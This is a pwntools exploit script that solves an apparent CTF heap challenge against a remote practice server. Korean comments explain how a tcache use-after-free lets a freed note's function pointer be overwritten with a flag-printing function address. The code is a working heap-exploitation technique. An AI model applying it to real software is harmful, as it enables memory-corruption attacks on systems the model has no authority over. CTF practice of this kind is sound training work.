from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch="i386", os='linux')
e = ELF('./uaf')

r = remote("ctf.j0n9hyun.xyz", 3020)

def AddNote(size: int, data: bytes):
    print(str(r.recvuntil(b":"),"utf-8"),1)
    r.sendline(b"1")
    print(str(r.recvuntil(b":"),"utf-8"), size)
    r.sendline(bytes(str(size), "utf-8"))
    print(str(r.recvuntil(b":"),"utf-8"), data)
    r.sendline(data)
    print(str(r.recv(),"utf-8"))

def DelNote(idx: int):
    print(2)
    r.sendline(b"2")
    print(str(r.recv(),"utf-8"), idx)
    r.sendline(bytes(str(idx), "utf-8"))
    print(str(r.recv(),"utf-8"))

def PrintNote(idx: int):
    print(str(r.recvuntil(b":"),"utf-8"),3)
    r.sendline(b"3")
    print(str(r.recv(),"utf-8"), idx)
    r.sendline(bytes(str(idx), "utf-8"))


# 노트를 추가할 때 다음과 같이 동적할당이 된다
'''
     4 byte    ,   4 byte                 data
+----------------------------+       +------------+
|  &print_func  |   pointer -------->|    size    |
+----------------------------+       +------------+
'''
# tcache는 ~0x400byte 크기까지 관리하며, LIFO 구조이다. 
# del_note 함수를 보면 데이터부분이 먼저 free된 다음,
# 함수포인터를 가진 구조체 8byte 부분이 free된다.
# 데이터를 8byte size로 입력해 2번 추가한 다음 모두 free하면
# tcache구조는 다음과 같다.
'''
add 8bytes
add 8bytes
del idx 0
del idx 1
            1 - struct          1 - data          0 - struct          0 - data
          +------------+     +------------+     +------------+     +------------+
tcache -> |   8 byte   |---->|   8 byte   |---->|   8 byte   |---->|   8 byte   |
          +------------+     +------------+     +------------+     +------------+
'''

# 다시 add할 때 8byte가 아니라 다른 size로 할당하면 tcache구조는 다음과 같아진다.
'''
             1 - data          0 - struct          0 - data
          +------------+     +------------+     +------------+
tcache -> |   8 byte   |---->|   8 byte   |---->|   8 byte   |
          +------------+     +------------+     +------------+
'''

# 현재 상태에서 8byte로 다시 add_note함수를 실행하면
# 제일 먼저 1번의 data공간이 구조체로 할당된 후 tcache구조가 다음과 같이 바뀌고,
'''
            0 - struct          0 - data
          +------------+     +------------+
tcache -> |   8 byte   |---->|   8 byte   |
          +------------+     +------------+
'''
# 0번의 구조체였던 공간이 data를 입력받는 공간으로 할당되어 tcache구조가 다음과 같이 최종적으로 바뀐다.
'''
             0 - data
          +------------+
tcache -> |   8 byte   |
          +------------+
'''
# 따라서 add_note함수를 호출해 flag출력하는 함수를 입력하면 free된 0번의 구조체가 덮히게 되고,
# free된 0번을 출력하려고 하면 함수포인터자리가 flag출력함수로 덮혀서 flag가 출력되게 된다.


cat_flag = p32(0x08048986)

AddNote(8, b"A")
AddNote(8, b"A")

print(str(r.recv(),"utf-8"))
DelNote(0)
print(str(r.recv(),"utf-8"))
DelNote(1)

AddNote(16, b"A")
AddNote(8, cat_flag)

PrintNote(0)

r.interactive()